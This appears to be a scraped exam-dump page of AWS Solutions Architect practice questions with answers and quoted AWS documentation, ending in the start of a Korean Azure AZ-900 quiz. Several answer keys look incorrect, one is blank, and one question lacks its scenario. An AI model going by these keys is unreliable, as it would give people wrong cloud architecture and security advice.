impact of a DDoS attack on resources. Which solution is MOST effective?\nA. Configure an AWS WAF ACL with rate-based rules Create an Amazon CloudFront distribution that points to the Application Load Balancer. Enable the EAF ACL on the CloudFront distribution B. Create a custom AWS Lambda function that adds identified attacks into a common vulnerability pool to capture a potential DDoS attack. use the identified information to modify a network ACL to block access. C. Enable VPC Flow Logs and store then in Amazon S3. Create a custom AWS Lambda functions that parses the logs looking for a DDoS attack. Modify a network ACL to block identified source IP addresses. D. Enable Amazon GuardDuty and , configure findings written 10 Amazon GloudWatch Create an event with Cloud Watch Events for DDoS alerts that triggers Amazon Simple Notification Service (Amazon SNS) Have Amazon SNS invoke a custom AWS lambda function that parses the logs looking for a DDoS attack Modify a network ACL to block identified source IP addresses \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has no existing file share services. A new project requires access to file storage that is mountable as a drive for on-premises desktops. The file server must authenticate users to an Active Directory domain before they are able to access the storage. Which service will allow Active Directory users to mount storage as a drive on their desktops?\nA. Amazon S3 Glacier B. AWS DataSync C. AWS Snowball Edge D. AWS Storage Gateway \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION What should the solutions architect recommend?\nA. Install MySQL on Amazon EC2 in the secondary Region B. Migrate the database to Amazon Aurora with cross-Region replicas C. Create another RDS for MySQL read replica in the secondary Region D. Implement Amazon ElastiCache to improve database query performance \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A gaming company has multiple Amazon EC2 instances in a single Availability Zone for its multiplayer game that communicates with users on Layer 4 The chief technology officer (CTO) wants to make the architecture highly available and cost-effective. What should a solutions architect do to meet these requirements? (Select TWO.)\nA. Increase the number of EC2 instances. B. Decrease the number of EC2 instances C. Configure a Network Load Balancer in front of the EC2 instances. D. Configure an Application Load Balancer in front of the EC2 instances E. Configure an Auto Scaling group to add or remove instances in multiple Availability Zones automatically. \r문제 풀이\r...\r\rAnswer: C E Explanation Network Load Balancer overview A Network Load Balancer functions at the fourth layer of the Open Systems Interconnection (OSI) model. It can handle millions of requests per second. After the load balancer receives a connection request, it selects a target from the target group for the default rule. It attempts to open a TCP connection to the selected target on the port specified in the listener configuration. When you enable an Availability Zone for the load balancer, Elastic Load Balancing creates a load balancer node in the Availability Zone. By default, each load balancer node distributes traffic across the registered targets in its Availability Zone only. If you enable cross-zone load balancing, each load balancer node distributes traffic across the registered targets in all enabled Availability Zones. For more information, see Availability Zones. If you enable multiple Availability Zones for your load balancer and ensure that each target group has at least one target in each enabled Availability Zone, this increases the fault tolerance of your applications. For example, if one or more target groups does not have a healthy target in an Availability Zone, we remove the IP address for the corresponding subnet from DNS, but the load balancer nodes in the other Availability Zones are still available to route traffic. If a client doesn\u0026rsquo;t honor the time-to-live (TTL) and sends requests to the IP address after it is removed from DNS, the requests fail. For TCP traffic, the load balancer selects a target using a flow hash algorithm based on the protocol, source IP address, source port, destination IP address, destination port, and TCP sequence number. The TCP connections from a client have different source ports and sequence numbers, and can be routed to different targets. Each individual TCP connection is routed to a single target for the life of the connection. For UDP traffic, the load balancer selects a target using a flow hash algorithm based on the protocol, source IP address, source port, destination IP address, and destination port. A UDP flow has the same source and destination, so it is consistently routed to a single target throughout its lifetime. Different UDP flows have different source IP addresses and ports, so they can be routed to different targets. An Auto Scaling group contains a collection of Amazon EC2 instances that are treated as a logical grouping for the purposes of automatic scaling and management. An Auto Scaling group also enables you to use Amazon EC2 Auto Scaling features such as health check replacements and scaling policies. Both maintaining the number of instances in an Auto Scaling group and automatic scaling are the core functionality of the Amazon EC2 Auto Scaling service. The size of an Auto Scaling group depends on the number of instances that you set as the desired capacity. You can adjust its size to meet demand, either manually or by using automatic scaling. An Auto Scaling group starts by launching enough instances to meet its desired capacity. It maintains this number of instances by performing periodic health checks on the instances in the group. The Auto Scaling group continues to maintain a fixed number of instances even if an instance becomes unhealthy. If an instance becomes unhealthy, the group terminates the unhealthy instance and launches another instance to replace it. https://docs.aws.amazon.com/elasticloadbalancing/latest/network/introduction.html https://docs.aws.amazon.com/autoscaling/ec2/userguide/AutoScalingGroup.html\r\r\r\r   QUESTION A company is moving its legacy workload to the AWS Cloud. The workload files will be shared, appended, and frequently accessed through Amazon EC2 instances when they are first created The files will be accessed occasionally as they age What should a solutions architect recommend?\nA. Store the data using Amazon EC2 instances with attached Amazon Elastic Block Store (Amazon EBS) data volumes B. Store the data using AWS Storage Gateway volume gateway and export rarely accessed data to Amazon S3 storage C. Store the data using Amazon Elastic File System (Amazon EFS) with lifecycle management enabled for rarely accessed data D. Store the data using Amazon S3 with an S3 lifecycle policy enabled to move data to S3 StandardInfrequent Access (S3 Standard-IA) \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company hosts an application on multiple Amazon EC2 instances The application processes messages from an Amazon SQS queue writes to an Amazon RDS table and deletes the message from the queue Occasional duplicate records are found in the RDS table The SQS queue does not contain any duplicate messages What should a solutions archived do to ensure messages are being processed once only?\nA. Use the CreateQueue API call to create a new queue B. Use the AddPermission API call to add appropriate permissions C. Use the ReceiveMessage API call to set an appropriate wait time. D. Use the ChangeMessageVisibility API call to increase the visibility timeout \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A solutions architect is planning the deployment of a new static website. The solution must minimize costs and provide at least 99% availability. Which solution meets these requirements?\nA. Deploy the application to an Amazon S3 bucket in one AWS Region that has versioning disabled. B. Deploy the application to Amazon EC2 instances that run in two AWS Regions and two Availability Zones. C. Deploy the application to an Amazon S3 bucket that has versioning and cross-Region replication enabled. D. Deploy the application to an Amazon EC2 instance that runs in one AWS Region and one Availability Zone. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is developing a real-time multiplier game that uses UDP for communications between client and servers in an Auto Scaling group Spikes in demand are anticipated during the day, so the game server platform must adapt accordingly. Developers want to store gamer scores and other non-relational data in a database solution that will scale without intervention. Which solution should a solution architect recommend?\nA. Use Amazon Route 53 for traffic distribution and Amazon Aurora Serverless for data storage. B. Use a Network Load Balancer for traffic distribution and Amazon DynamoDB on-demand for data storage. C. Use a Network Load Balancer for traffic distribution and amazon Aura Global for data storage. D. Use an Application Load Balancer for traffic distribution and Amazon DynamoDB global tables for data storage \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company is using a fleet of Amazon EC2 instances to ingest data from on-premises data sources. The data is in JSON format and ingestion rates can be as high as 1 MB/s. When an EC2 instance is rebooted, the data in-flight is lost. The company\u0026rsquo;s data science team wants to query ingested data in near-real time. Which solution provides near-real-time data querying that is scalable with minimal data loss?\nA. Publish data to Amazon Kinesis Data Streams. Use Kinesis Data Analytics to query the data. B. Publish data to Amazon Kinesis Data firehose with Amazon Redshift as the destination. Use Amazon Redshift to query the data. C. Store ingested data in an EC2 instance store Publish data to Amazon Kinesis Data Firehose with Amazon S3 as the destination. Use Amazon Athena to query the data. D. Store ingested data in an Amazon Elastic Block Store (Amazon EBS) volume. Publish data to Amazon ElastiCache for Redis. Subscribe to the Redis channel to query the data. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company previously migrated its data warehouse solution to AWS. The company also has an AWS Direct Connect connection. Corporate office users query the data warehouse using a visualization tool. The average size of a query returned by the data warehouse is 50 MB and each webpage sent by the visualization tool is approximately 500 KB. Result sets returned by the data warehouse are not cached. Which solution provides the LOWEST data transfer egress cost for the company?\nA. Host the visualization tool on premises and query the data warehouse directly over the internet. B. Host the visualization tool in the same AWS Region as the data warehouse. Access it over the internet. C. Host the visualization tool on premises and query the data warehouse directly over a Direct Connect connection at a location in the same AWS Region. D. Host the visualization tool in the same AWS Region as the data warehouse and access it over a Direct Connect connection at a location in the same Region. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has a web application with sporadic usage patterns. There is heavy usage at the beginning of each month, moderate usage at the start of each week, and unpredictable usage during the week. The application consists of a web server and a MySQL database server running inside the data center. The company would like to move the application to the AWS Cloud, and needs to select a cost-effective database platform that will not require database modifications. Which solution will meet these requirements?\nA. Amazon DynamoDB B. Amazon RDS for MySQL C. MySQL-compatible Amazon Aurora Serverless D. MySQL deployed on Amazon EC2 in an Auto Scaling group \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION 301-    QUESTION A company is using Site-to-Site VPN connections for secure connectivity to its AWS Cloud resources from on premises. Due to an increase in traffic across the VPN connections to the Amazon EC2 instances, users are experiencing slower VPN connectivity Which solution will improve the VPN throughput?\nA. Implement multiple customer gateways for the same network to scale the throughput B. Use a transit gateway with equal cost multipath routing and add additional VPN tunnels C. Configure a virtual private gateway with equal cost multipath routing and multiple channels D. Increase the number of tunnels in the VPN configuration to scale the throughput beyond the default limit \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company runs an application using Amazon ECS. The application creates resized versions of an original image and then makes Amazon S3 API calls to store the resized images in Amazon S3. How can a solutions architect ensure that the application has permission to access Amazon S3?\nA. Update the S3 role in AWS IAM to allow read/write access from Amazon ECS, and then relaunch the container. B. Create an IAM role with S3 permissions, and then specify that role as the taskRoleArn in the task definition. C. Create a security group that allows access from Amazon ECS to Amazon S3, and update the launch configuration used by the ECS cluster. D. Create an IAM user with S3 permissions, and then relaunch the Amazon EC2 instances for the ECS cluster while logged in as this account. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has a three-tier environment on AWS that ingests sensor data from its users' devices. The traffic flows through a Network Load Balancer (NLB) then to Amazon EC2 instances for the web tier, and finally to EC2 instances for the application tier that makes database calls What should a solutions architect do to improve the security of data in transit to the web tier?\nA. Configure a TLS listener and add the server certificate on the NLB. B. Configure AWS Shield Advanced and enable AWS WAF on the NLB C. Change the load balancer to an Application Load Balancer and attach AWS WAF to it. D. Encrypt the Amazon Elastic Block Store (Amazon EBS) volume on the EC2 instances using AWS Key Management Service (AWS KMS) \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company Is reviewing Its AWS Cloud deployment to ensure its data is not accessed by anyone without appropriate authorization. A solutions architect is tasked with identifying all open Amazon S3 buckets and recording any S3 bucket configuration changes. What should the solutions architect do to accomplish this?\nA. Enable AWS Config service with the appropriate rules B. Enable AWS Trusted Advisor with the appropriate checks. C. Write a script using an AWS SDK to generate a bucket report D. Enable Amazon S3 server access logging and configure Amazon CloudWatch Events. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company hosts an application on an Amazon EC2 instance that requires a maximum of 200 GB storage space. The application is used infrequently, with peaks during mornings and evenings. Disk I/O varies, but peaks at 3,000 IOPS. The chief financial officer of the company is concerned about costs and has asked a solutions architect to recommend the most cost-effective storage option that does not sacrifice performance. Which solution should the solutions architect recommend?\nA. Amazon EBS Cold HDD (sc1) B. Amazon EBS General Purpose SSD (gp2) C. Amazon EBS Provisioned IOPS SSD (io1) D. Amazon EBS Throughput Optimized HDD (st1) \r문제 풀이\r...\r\rAnswer: B  범용 SSD는 최대 3,000 IOPS가 가능합니다.  \r\r\r   QUESTION A company is developing a video conversion application hosted on AWS. The application will be available in two tiers: a free tier and a paid tier. Users in the paid tier will have their videos converted first and then the tree tier users will have their videos converted. Which solution meets these requirements and is MOST cost-effective?\nA. One FIFO queue for the paid tier and one standard queue for the free tier B. A single FIFO Amazon Simple Queue Service (Amazon SQS) queue for all file types C. A single standard Amazon Simple Queue Service (Amazon SQS) queue for all file types D. Two standard Amazon Simple Queue Service (Amazon SQS) queues with one for the paid tier and one for the free tier \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company recently released a new type of internet-connected sensor. The company is expecting lo sell thousands of sensors, which are designed to stream high volumes of data each second to a central location. A solutions architect must design a solution that ingests and stores data so that engineering teams can analyze it in near-real time with millisecond responsiveness. Which solution should the solutions architect recommend?\nA. Use an Amazon SQS queue to ingest the data. Consume the data with an AWS Lambda function, which then stores the data in Amazon Redshift. B. Use an Amazon SOS queue to ingest the data. Consume the data with an AWS Lambda function, which then stores the data in Amazon DynamoDB. C. Use Amazon Kinesis Data Streams to ingest the data. Consume the data with an AWS Lambda function, which then stores the data in Amazon Redshift. D. Use Amazon Kinesis Data Streams to ingest the data. Consume the data with an AWS Lambda function, which then stores the data in Amazon DynamoDB. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is planning to use Amazon S3 lo store images uploaded by its users The images must be encrypted at rest in Amazon S3 The company does not want to spend time managing and rotating the keys, but it does want to control who can access those keys What should a solutions architect use to accomplish this?\nA. Server-Side Encryption with keys stored in an S3 bucket B. Server-Side Encryption with Customer-Provided Keys (SSE-C) C. Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3) D. Server-Side Encryption with AWS KMS-Managed Keys (SSE-KMS) \r문제 풀이\r...\r\rAnswer: D Explanation Link: https://docs.aws.amazon.com/AmazonS3/latest/dev/serv-side-encryption.html \u0026ldquo;Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS) is similar to SSE-S3, but with some additional benefits and charges for using this service. There are separate permissions for the use of a CMK that provides added protection against unauthorized access of your objects in Amazon S3. SSE-KMS also provides you with an audit trail that shows when your CMK was used and by whom.\u0026rdquo; Server-Side Encryption: Using SSE-KMS You can protect data at rest in Amazon S3 by using three different modes of server-side encryption: SSE-S3, SSE-C, or SSE-KMS. SSE-S3 requires that Amazon S3 manage the data and master encryption keys. For more information about SSE-S3, see Protecting Data Using Server-Side Encryption with Amazon S3-Managed Encryption Keys (SSE-S3). SSE-C requires that you manage the encryption key. For more information about SSE-C, see Protecting Data Using Server-Side Encryption with Customer-Provided Encryption Keys (SSE-C). SSE-KMS requires that AWS manage the data key but you manage the customer master key (CMK) in AWS KMS. The remainder of this topic discusses how to protect data by using server-side encryption with AWS KMS-managed keys (SSE-KMS). You can request encryption and select a CMK by using the Amazon S3 console or API. In the console, check the appropriate box to perform encryption and select your CMK from the list. For the Amazon S3 API, specify encryption and choose your CMK by setting the appropriate headers in a GET or PUT request. https://docs.aws.amazon.com/kms/latest/developerguide/services-s3.html#sse\r\r\r\r   QUESTION A company has an application running on Amazon EC2 instances in a private subnet. The application needs to store and retrieve data in Amazon S3 To reduce costs, the company wants to configure its AWS resources in a cost-effective manner How should the company accomplish this?\nA. Deploy a NAT gateway to access the S3 buckets B. Deploy AWS Storage Gateway to access the S3 buckets C. Deploy an S3 gateway endpoint to access the S3 buckets D. Deploy an S3 interface endpoint to access the S3 buckets. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company wants to use an AWS Region as a disaster recovery location for its on-premises infrastructure. The company has 10 TB of existing data, and the on-premise data center has a 1 Gbps internet connection. A solutions architect must find a solution so the company can have its existing data on AWS in 72 hours without transmitting it using an unencrypted channel. Which solution should the solutions architect select?\nA. Send the initial 10 TB of data to AWS using FTP. B. Send the initial 10 TB of data to AWS using AWS Snowball. C. Establish a VPN connection between Amazon VPC and the company\u0026rsquo;s data center. D. Establish an AWS Direct Connect connection between Amazon VPC and the company\u0026rsquo;s data center. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company runs an online marketplace web application on AWS. The application serves hundreds of thousands of users during peak hours. The company needs a scalable, near-real-time solution to share the details of millions of financial transactions with several other internal applications. Transactions also need to be processed to remove sensitive data before being stored in a document database for low-latency retrieval. What should a solutions architect recommend to meet these requirements?\nA. Store the transactions data into Amazon DynamoDB. Set up a rule in DynamoDB to remove sensitive data from every transaction upon write. Use DynamoDB Streams to share the transactions data with other applications. B. Stream the transactions data into Amazon Kinesis Data Firehose to store data in Amazon DynamoDB and Amazon S3. Use AWS Lambda integration with Kinesis Data Firehose to remove sensitive data. Other applications can consume the data stored in Amazon S3. C. Stream the transactions data into Amazon Kinesis Data Streams. Use AWS Lambda integration to remove sensitive data from every transaction and then store the transactions data in Amazon DynamoDB. Other applications can consume the transactions data off the Kinesis data stream. D. Store the batched transactions data in Amazon S3 as files. Use AWS Lambda to process every file and remove sensitive data before updating the files in Amazon S3. The Lambda function then stores the data in Amazon DynamoDB. Other applications can consume transaction files stored in Amazon S3. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has multiple AWS accounts, for various departments. One of the departments wants to share an Amazon S3 bucket with all other department. Which solution will require the LEAST amount of effort?\nA. Enable cross-account S3 replication for the bucket B. Create a pre signed URL tor the bucket and share it with other departments C. Set the S3 bucket policy to allow cross-account access to other departments D. Create IAM users for each of the departments and configure a read-only IAM policy \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A bicycle sharing company is developing a multi-tier architecture to track the location of its bicycles during peak operating hours The company wants to use these data points in its existing analytics platform A solutions architect must determine the most viable multi-tier option to support this architecture The data points must be accessible from the REST API Which action meets these requirements for storing and retrieving location data?\nA. Use Amazon Athena with Amazon S3 B. Use Amazon API Gateway with AWS Lambda C. Use Amazon QuickSight with Amazon Redshift D. Use Amazon API Gateway with Amazon Kinesis Data Analytics \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has hired a new cloud engineer who should not have access to an Amazon S3 bucket named Company Confidential. the cloud engineer must be able to read from and write to an S3 bucket called AdminTools. Which IAM policy will meet these requirements?\nA. Option A B. Option B C. Option C D. Option D \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is hosting multiple websites for several lines of business under its registered parent domain. Users accessing these websites will be routed to appropriate backend Amazon EC2 instances based on the subdomain. The websites host static webpages, images, and server-side scripts like PHP and JavaScript. Some of the websites experience peak access during the first two hours of business with constant usage throughout the rest of the day. A solutions architect needs to design a solution that will automatically adjust capacity to these traffic patterns while keeping costs low. Which combination of AWS services or features will meet these requirements? (Select TWO.)\nA. AWS Batch B. Network Load Balancer C. Application Load Balancer D. Amazon EC2 Auto Scaling E. Amazon S3 website hosting \r문제 풀이\r...\r\rAnswer: D E \r\r\r   QUESTION A company is migrating a NoSQL database cluster to Amazon EC2. The database automatically replicates data to maintain at least three copies of the data. I/O throughput of the servers is the highest priority. Which instance type should a solutions architect recommend for the migration?\nA. Storage optimized instances with instance store B. Burstable general purpose instances with an Amazon Elastic Block Store (Amazon EBS) volume C. Memory optimized instances with Amazon Elastic Block Store (Amazon EBS) optimization enabled D. Compute optimized instances with Amazon Elastic Block Store (Amazon EBS) optimization enabled \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION An application uses an Amazon RDS MySQL DB instance. The RDS database is becoming low on disk space. A solutions architect wants to increase the disk space without downtime Which solution meets these requirements with the LEAST amount of effort?\nA. Enable storage auto scaling in RDS. B. Increase the RDS database instance size C. Change the RDS database instance storage type to Provisioned IOPS. D. Back up the RDS database, increase the storage capacity, restore the database and stop the previous instance \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION An application runs on Amazon EC2 instances across multiple Availability Zones The instances run in an Amazon EC2 Auto Scaling group behind an Application Load Balancer The application performs best when the CPU utilization of the EC2 instances is at or near 40% What should a solutions architect do to maintain the desired performance across all instances m the group?\nA. Use a simple scaling policy to dynamically scale the Auto Scaling group B. Use a target tracking policy to dynamically scale the Auto Scaling group C. Use an AWS Lambda function to update the desired Auto Scaling group capacity D. Use scheduled scaling actions to scale up and scale down the Auto Scaling group \r문제 풀이\r...\r\rAnswer: \r\r\r   QUESTION A company is deploying an application in three AWS Regions using an Application Load Balancer Amazon Route 53 will be used to distribute traffic between these Regions. Which Route 53 configuration should a solutions architect use to provide the MOST high-performing experience?\nA. Create an A record with a latency policy. B. Create an A record with a geolocation policy. C. Create a CNAME record with a failover policy. D. Create a CNAME record with a geoproximity policy. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company needs to share an Amazon S3 bucket with an external vendor. The bucket owner must be able to access all objects. Which action should be taken to share the S3 bucket?\nA. Update the bucket to be a Requester Pays bucket B. Update the bucket to enable cross-origin resource sharing (CPORS) C. Create a bucket policy to require users to grant bucket-owner-full when uploading objects D. Create an IAM policy to require users to grant bucket-owner-full control when uploading objects. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company\u0026rsquo;s website is using an Amazon RDS MySQL Multi-AZ DB instance for its transactional data storage. There are other internal systems that query this DB instance to fetch data for internal batch processing. The RDS DB instance slows down significantly the internal systems fetch data. This impacts the website\u0026rsquo;s read and write performance, and the users experience slow response times. Which solution will improve the website\u0026rsquo;s performance?\nA. Use an RDS PostgreSQL DB instance instead of a MySQL database. B. Use Amazon ElastiCache to cache the query responses for the website. C. Add an additional Availability Zone to the current RDS MySQL Multi.AZ DB instance. D. Add a read replica to the RDS DB instance and configure the internal systems to query the read replica. \r문제 풀이\r...\r\rAnswer: D Explanation Amazon RDS Read Replicas Enhanced performance You can reduce the load on your source DB instance by routing read queries from your applications to the read replica. Read replicas allow you to elastically scale out beyond the capacity constraints of a single DB instance for read-heavy database workloads. Because read replicas can be promoted to master status, they are useful as part of a sharding implementation. To further maximize read performance, Amazon RDS for MySQL allows you to add table indexes directly to Read Replicas, without those indexes being present on the master. https://aws.amazon.com/rds/features/read-replicas/\r\r\r\r   QUESTION A company wants to optimize the cost of its data storage for data that is accessed quarterly. The company requires high throughput, low latency, and rapid access, when needed Which Amazon S3 storage class should a solutions architect recommend?\nA. Amazon S3 Glacier (S3 Glacier) B. Amazon S3 Standard (S3 Standard) C. Amazon S3 Intelligent-Tiering (S3 Intelligent-Tiering) D. Amazon S3 Standard-Infrequent Access (S3 Standard-IA) \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company runs a web service on Amazon EC2 instances behind an Application Load Balancer The instances run in an Amazon EC2 Auto Scaling group across two Availability Zones The company needs a minimum of four instances at all limes to meet the required service level agreement (SLA) while keeping costs low. If an Availability Zone fails, how can the company remain compliant with the SLA?\nA. Add a target tracking scaling policy with a short cooldown period B. Change the Auto Scaling group launch configuration to use a larger instance type C. Change the Auto Scaling group to use six servers across three Availability Zones D. Change the Auto Scaling group to use eight servers across two Availability Zones \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION An application running on an Amazon EC2 instance needs to access an Amazon DynamoDB table Both the EC2 instance and the DynamoDB table are in the same AWS account A solutions architect must configure the necessary permissions. Which solution will allow least privilege access to the DynamoDB table from the EC2 instance?\nA. Create an IAM role with the appropriate policy to allow access to the DynamoDB table Create an instance profile to assign this IAM role to the EC2 instance B. Create an IAM role with the appropriate policy to allow access to the DynamoDB table Add the EC2 instance to the trust relationship policy document to allow it to assume the role C. Create an IAM user with the appropriate policy to allow access to the DynamoDB table Store the credentials in an Amazon S3 bucket and read them from within the application code directly. D. Create an IAM user with the appropriate policy to allow access to the DynamoDB table Ensure that the application stores the IAM credentials securely on local storage and uses them to make the DynamoDB calls \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company must re-evaluate its need for the Amazon EC2 instances it currently has provisioned in an Auto Scaling group. At present, the Auto Scaling group is configured for minimum of two instances and a maximum of four instances across two Availability zones. A Solutions architect reviewed Amazon CloudWatch metrics and found that CPU utilization is consistently low for the EC2 instances. What should the solutions architect recommend to maximize utilization while ensuring the application remains fault tolerant?\nA. Remove some EC2 instances to increase the utilization of remaining instances. B. Increase the Amazon Elastic Block Store (Amazon EBS) capacity of instances with less CPU utilization. C. Modify the Auto Scaling group scaling policy to scale in and out based on a higher CPU utilization metric. D. Create a new launch configuration that uses smaller instance types. Update the existing Auto Scaling group. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is preparing to migrate its on-premises application to AWS The application consists of application servers and a Microsoft SQL Server database The database cannot be migrated to a different engine because SQL Server features are used in the application\u0026rsquo;s NET code. The company wants to attain the greatest availability possible while minimizing operational and management overhead What should a solutions architect do to accomplish this?\nA. Install SQL Server on Amazon EC2 in a Multi-AZ deployment B. Migrate the data to Amazon RDS for SQL Server in a Multi-AZ deployment. C. Deploy the database on Amazon RDS for SQL Server with Multi-AZ Replicas. D. Migrate the data to Amazon RDS for SQL Server in a cross Region Multi-AZ deployment \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company is seeing access requests by some suspicious IP addresses. The security team discovers the requests are from different IP addresses under the same CIDR range. What should a solutions architect recommend to the team?\nA. Add a rule in the inbound table of the security to deny the traffic from that CIDR range. B. Add a rule in the outbound table of the security group to deny the traffic from that CIDR range. C. Add a deny rule in the inbound table of the network ACL with a lower number than other rules. D. Add a deny rule in the outbound table of the network ACL with a lower rule number than other rules. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company is planning to transfer multiple terabytes of data to AWS. The data is collected offline from ships. The company want to run complex transformation before transferring the data. Which AWS service should a solutions architect recommend for this migration?\nA. AWS Snowball B. AWS Snowmobile C. AWS Snowball Edge Storage Optimize D. AWS Snowball Edge Compute Optimize \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company\u0026rsquo;s near-real-time streaming application is running on AWS As (he data is ingested a job runs on the data and takes 30 minutes to complete The workload frequently experiences high latency due to large amounts of incoming data A solutions architect needs to design a scalable and serverless solution to enhance performance Which combination of steps should the solutions architect take? (Select TWO)\nA. Use Amazon Kinesis Data Firehose to ingest the data B. Use AWS Lambda with AWS Step Functions to process the data C. Use AWS Database Migration Service (AWS DMS) to ingest the data D. Use Amazon EC2 instances in an Auto Scaling group to process the data E. Use AWS Fargate with Amazon Elastic Container Service (Amazon ECS) to process the data. \r문제 풀이\r...\r\rAnswer: A E \r\r\r   QUESTION An Amazon EC2 administrator created the following policy associated with an IAM group containing several users. What is the effect of this policy?\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;ec2:TerminateInstances\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;IpAddress\u0026#34;: { \u0026#34;aws:SourceIP\u0026#34;: \u0026#34;10.100.100.0/24\u0026#34; } } }, { \u0026#34;Effect\u0026#34;: \u0026#34;Deny\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;ec2:*\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;StringNotEquls\u0026#34;: { \u0026#34;aws:Region\u0026#34;: \u0026#34;us-east-1\u0026#34; } } } ] } A. Users can terminate an EC2 instance in any AWS Region except us-east-1. B. Users can terminate an EC2 instance with the IP address 10.100. 1001 in the us-east-1 Region C. Users can terminate an EC2 instance in the us-east-1 Region when the user\u0026rsquo;s source IP is 10.100.100.254 D. Users cannot terminate an EC2 instance in the us-east-1 Region when the user\u0026rsquo;s source IP is 10.100.100. 254 \r문제 풀이\r...\r\rAnswer: C \r\r\r"}),a.add({id:176,href:'/docs/azure/azuretraining/az-900/',title:"Az-900 : 문제풀이",content:"Az-900 시험대비 문제풀이    다음 각 명령문에 대해 해당 명령문이 참이면 Yes 거짓이면 No를 선택하십시오.      문제 Yes No     PaaS는 Azure 서비스에서 모든 시스템의 제공하고 호스트는 웹, 애플리케이션을 모두 컨트롤 한다.       PaaS의 웹, 애플리케이션에서 자동으로 Scale ability를 수행한다.       PaaS는 솔루션은 사용자 지정 응용 프로그램에 기능을 지속적으로 추가하는 전문 개발 서비스를 제공한다.          \r문제 풀이\r...\r\r    문제 Yes No     PaaS는 Azure 서비스에서 모든 시스템의 제공하고 호스트는 웹, 애플리케이션을 모두 컨트롤 한다.   ㅇ   PaaS의 웹, 애플리케이션에서 자동으로 Scale ability를 수행한다. ㅇ     PaaS는 솔루션은 사용자 지정 응용 프로그램에 기능을 지속적으로 추가하는 전문 개발 서비스를 제공한다. ㅇ         PaaS는 Platform as a service로 모든 부분을 호스트가 사용하는 것은 IaaS이다.\n  Scale UP, OUT은 Azure에서 수행한다.\n  Azure의 기술지원 솔루션에는 전문 개발 서비스를 제공한다.\n  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 Yes 거짓이면 No를 선택하십시오.      문제 Yes No     Azure는 CapEx, OpEx 사이의 비용을 유연하게 사용한다.       만약 두 개의 VM을 B2S 크기로 생성하면 다른 VM은 매월 항상 같은 가격이 결제된다.       만약 VM이 정지되어도 스토리지 비용은 지불해야한다.          \r문제 풀이\r...\r\r    문제 Yes No     Azure는 CapEx, OpEx 사이의 비용을 유연하게 사용한다. ㅇ     만약 두 개의 VM을 B2S 크기로 생성하면 다른 VM은 매월 항상 같은 가격이 결제된다.   ㅇ   만약 VM이 정지되어도 스토리지 비용은 지불해야한다. ㅇ       \r\r\r    SaaS 솔루션을 구현할 때 고 가용성으로 구성해야 하는 경우 고려해야하는 사항은?\n  변경할 필요 없다.\n  확장 성 규칙 정의\n  SaaS 솔루션 설치\n  SaaS 솔루션 구성\n      \r문제 풀이\r...\r\r 4 고 가용성을 구성하기 위해서는 솔루션을 구성해야한다.\n \r\r\r   여러 서버가 포함 된 온-프레미스 네트워크가 있습니다. 모든 서버를 Azure로 마이그레이션 할 계획입니다. 단일 Azure 데이터 센터가 장기간 오프라인 상태가 되는 경우 일부 서버를 사용할 수 있도록 솔루션을 권장해야합니다. 다음 중 추천하는 것은?   내결함성\n  탄력성\n  확장성\n  낮은 지연\n      \r문제 풀이\r...\r\r 1\n  끊끼지 않는 서비스와 연관된 것은 내결함성입니다.\n \r\r\r   사설 클라우드에서 인프라를 호스팅하는 조직은 데이터 센터를 폐기할 수 있습니다. 위의 설명이 정확하면 변경할 필요 없음을 선택하고, 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경할 필요 없습니다.\n  하이브리드 클라우드\n  공용 클라우드\n  Hyper-V 호스트\n      \r문제 풀이\r...\r\r 공용 클라우드 프라이빗 클라우드를 폐기하기 위해서는 공용(퍼블릭)클라우드를 100% 사용해야합니다.\n \r\r\r   퍼블릭 클라우드의 두 가지 특징은 